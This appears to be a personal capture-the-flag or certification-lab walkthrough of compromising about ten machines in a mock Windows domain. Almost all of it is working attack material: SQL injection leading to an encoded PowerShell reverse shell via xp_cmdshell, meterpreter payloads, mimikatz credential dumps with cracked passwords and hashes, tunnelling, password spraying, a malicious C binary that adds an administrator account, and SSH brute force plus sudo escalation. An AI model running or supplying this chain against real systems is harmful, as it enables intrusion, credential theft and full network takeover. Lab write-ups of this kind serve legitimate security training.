



### nmap

```
# Host discovery
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2
	192.168.189.120
	192.168.189.121
	192.168.189.122
	192.168.189.254
OR 
nmap -sS --top-ports 20 --open 192.168.189.0/24 -oG port-sweep.txt

# Identify ports and services
nmap -p- -sV -sS -iL targets.txt -oG nmap_120_121_122_254_ports.txt



```

### Fuzz

```

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://192.168.189.121/FUZZ.aspx

# Found login page
	Login.aspx

```

### SQLi

```

# Trying to login with SQLi payloads generates an SQL error message

admin')-- -
admin' or '1'='1

# Tried running sqlmap and the username parameter is exploitable

# Trying to manually exploit the SQLi
# Seem to be blind/boolean injection

# Managed to get a reverse shell using revshells.com/ to generate a PS B64 encoded payload
nc -nvlp 1234

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

' UNION SELECT 1,2; EXEC xp_cmdshell 'powershell -e JABjAG...' -- -

```

### Stabalize the shell with msfvenom

```

# Create the payload
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.45.233 lport=443 -f exe > met.exe

# Set up listener in msfconsole
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.119.5
set LPORT 443
set ExitOnSession false
run -j


```


### Privesc with meterpeter getsystem & manually

- Worked: ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
	- Try to manually get priv esc
		- SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

```

# The exploit can be done when SeImpersonatePrivilege is enabled

1. Tried with printspoofer but did not work

2. Tried all the potatoes and did not work

3. Went back to printspoofer and now it worked
	print.exe -i -c cmd 	(make sure to run in cmd not PS)
	Set up a new stable shell with met.exe

Found proof.txt
	c:/Users/Administrator/Desktop/proof.txt
	
No local.txt on the system

```

### Run mimikatz

```

mimikatz.exe
privilege::debug
lsadump::sam
	User : Administrator
	Hash NTLM: b2c03054c306ac8fc5f9d188710b0168
	
sekurlsa::logonpasswords
	User Name         : joe
	* NTLM     : 08d7a47a6f9f66b97b1bae4178747494
	

```

### Crack the password using hashcat

```

hashcat -m 1000 joe.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	08d7a47a6f9f66b97b1bae4178747494:Flowers1
	
Add to passwords.txt
Add to creds.txt
	joe:Flowers1

```


### Analysing with bloodhound

```

# Start bloodhound software
sudo neo4j start 
bloodhound

# Save down all computers and users
MATCH (m:User) RETURN m
MATCH (m:Computer) RETURN m

leon is domain admin
	HasSession DEV04

```


### Enumerate the internal network

```

# Config the msf routing
use multi/manage/autoroute
set session 1
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j

# Check for shares
proxychains netexec smb 172.16.194.10-13 172.16.194.82-83 -u joe -p "Flowers1" -d medtech.com --shares
	SMB         172.16.249.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
	And many READ rights to other computers/shares

# Run a nmap scan over proxychain, make sure to use -sT otherwise it wont work over proxychain!!
sudo proxychains -q nmap -sT -sV -oN nmap_internal --top-ports 10 172.16.194.10-13 172.16.194.82-83

# Proxychains with netexec
proxychains netexec smb 172.16.145.240-241 172.16.145.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
 
# Run a nmap scan over proxychain, make sure to use -sT otherwise it wont work over proxychain!!
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.155.240 172.16.155.241 172.16.155.254


```

### Lateral movement to files02

```

For some reason it was not possible to run netexec anymore, however I found that .11 was "pwned" from previous run so I can use psexec to login to the host
proxychains impacket-psexec medtech/joe:Flowers1@172.16.194.11

# Stablize shell with met.exe

# Found flag
cat c:/Users/joe/Desktop/local.txt
	cd18a2a23e32bcb6b618906423f1fb13
cat c:/Users/Administrator/Desktop/proof.txt
	95bc2499f00c4dbc37fe489f054dfe06


```

### Run mimikatz

```

mimikatz.exe
privilege::debug
lsadump::sam
	User : Administrator
	Hash NTLM: f1014ac49bae005ee3ece5f47547d185
	
sekurlsa::logonpasswords
	Nothing
	
```

### Search for files

```

#List all files for Users
Get-childitem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue

C:\Users\joe\Documents\fileMonitorBackup.log
   88934 Oct 04 11:21  Backup      daisy        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
   88605 Oct 04 11:21  Backup	   toad         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068                                                                                    
   88137 Oct 04 11:21  Backup	   wario        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e                                                                                                                  
   87139 Oct 04 11:21  Backup      goomba       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436

```


### Crack the password

```

hashcat -m 1000 wario.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	fdf36048c1cf88f5630381c5e38feb8e:Mushroom!

```

### Set up tunnel with ligolo (So much better :D)
https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
```

# Set up the tunnel network on Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Start the proxy
./proxy -selfcert -laddr 0.0.0.0:443 

# Transfer the agent to the target and connect to the proxy
iwr 192.168.45.180:8000/agent.exe -outfile agent.exe
.\agent.exe -connect 192.168.45.180:443 -ignore-cert

# Start the connection in ligolo
session
ifconfig
start

# Check that the interface is up
ip a show ligolo

# Add IP to routing table on Kali
sudo ip route add 192.168.110.0/24 dev ligolo

# You can now run any commands against the internal network!

```


### Connect to .83 with the found wario creds

```

# Use evil-winrm without '' for the password!
evil-winrm -i 172.16.217.83 -u wario -p Mushroom!

#List all files for Users
Get-childitem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue
type C:\Users\wario\Desktop\local.txt
	e038f3595e019aa8e9be2fbe1b524dfe

```


### Run winpeas

```

./winpeas.exe

# Intresting things

auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload - isDotNet
    File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])


RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [AppendData/CreateDirectories]
    File: /UserInstall


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]


```

### Exploit binary hijacking

```

# Tried to create a new user malicious .exe and it worked
nano payload.c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user test password123! /add");
  i = system ("net localgroup administrators test /add");
  
  return 0;
}

x86_64-w64-mingw32-gcc payload.c -o payload.exe
iwr 192.168.45.180:8000/payload.exe -outfile auditTracker.exe
C:\DevelopmentExecutables> sc stop auditTracker
C:\DevelopmentExecutables> sc start auditTracker
stop-service auditTracker
start-service auditTracker

# Tried to do same thing but with a msfvenom rev shell and did not work?
# Continue tommorow
# Tried again worked with a normal rev shell but not meterpeter

```

### Enumeration from system user .83

```

# Found proof.txt

# Search for files under /users
Get-childitem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue

Directory: C:\Users\administrator.MEDTECH\Documents\Security\Database
Mode                 LastWriteTime         Length Name                       
----                 -------------         ------ ----                       
-a----        10/28/2022   8:14 AM          16384 test.jfm                   
-a----        10/28/2022   8:14 AM        1048576 test.sdb

# Run mimikatz
./mimikatz.exe
privilege::debug
lsadump::sam
	User : Administrator
	NTLM: 00fd074ec24fd70c76727ee9b2d7aacd
	
	User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

sekurlsa::logonpasswords

# Crack offsec password				(Maybe not relevant but add to password.txt)
2892d26cdf84d7a70e2eb3b9f05c425e:lab

```


### Password spray the internal network

```

nxc smb 172.16.217.10-14 172.16.217.82-83 -u usernames.txt -p passwords.txt --continue-on-success
	172.16.217.82   445    CLIENT01  medtech.com\yoshi:Mushroom! (Pwn3d!)

# Yoshi uses the same password as wario and we can use psexec to auth to client01
impacket-psexec medtech/yoshi:Mushroom\!@172.16.217.82

```

### Enumeration from system user .82

```

# Found file hole.txt
	leon:rabbit!:)

# The password did not work! (rabbit hole)
# Cheated a bit and looked in discord and found password had been changed
# You are supposed to find the actual password on another machine
# With yoshi:Mushroom! I believe
# Password that actually worked
impacket-psexec medtech/leon:rabbit\:\)@172.16.217.10

# For now get the flags and find the right path after

# See .12 on how to find the actually leon password!!!

```

### Enumeration .12

```

# Possible to RDP using yoshi:Mushroom!
xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:172.16.217.12 /u:"yoshi@medtech.com" /p:"Mushroom\!"

# Do privEsc on windows
C:\temp
	backup.exe
	
# Replace backup.exe with a rev shell
	BOOM system reverse shell!

# Tried to list schedueled tasks but couldn't find it but one can assume it's a scheduled task to backup the system.
# Possible to list the process
Get-Process backup

# Run mimikatz
./mimikatz
sekurlsa::logonpasswords
	Username : leon                                                             NTLM     : 2e208ad146efda5bc44869025e06544a 
	
# Crack with hashcat
	2e208ad146efda5bc44869025e06544a:$HEX[7261626269743a29]
	
# Hex --> ASCI
	rabbit:)

```

### Enumeration .10

```

# Search for files
Get-childitem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue

type credentials.txt
web01: offsec/century62hisan51

type C:\Users\Administrator\Desktop\proof.txt
8f578a7f4111791a7fc0634fa8990ee5


```

### enumeration .120

```

# Found working password with hydra
hydra -L usernames.txt -P passwords.txt ssh://172.16.194.120
	offsec:century62hisan51
	
ssh offsec@192.168.217.120


```

### .122

```

# Bruteforce the SSH (offsec was used to ssh to other public ssh)
hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.217.122
	password
	
ssh offsec@192.168.217.122
	password
	
cat local.txt
	7a4cde46519f0b4aa56bb1177db66970
	
# Priv esc
sudo -l
	(ALL : ALL) /usr/sbin/openvpn

# Check GTFObin
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
whoami
	root
	
# Found ssh private key for mario
ls /home/mario/.ssh
	-rw------- 1 mario mario 2590 Oct  3  2022 id_rsa


```

### .14

```

# Copy over the id_rsa file to kali & connect to the last machine
ssh mario@172.16.217.14 -i mario_id_rsa

cat local.txt
	cbbb7bb1f5606a425be3f1edd8c631f9

```
&nbsp;

# ALL FUCKING DONE
- 10 machines pwned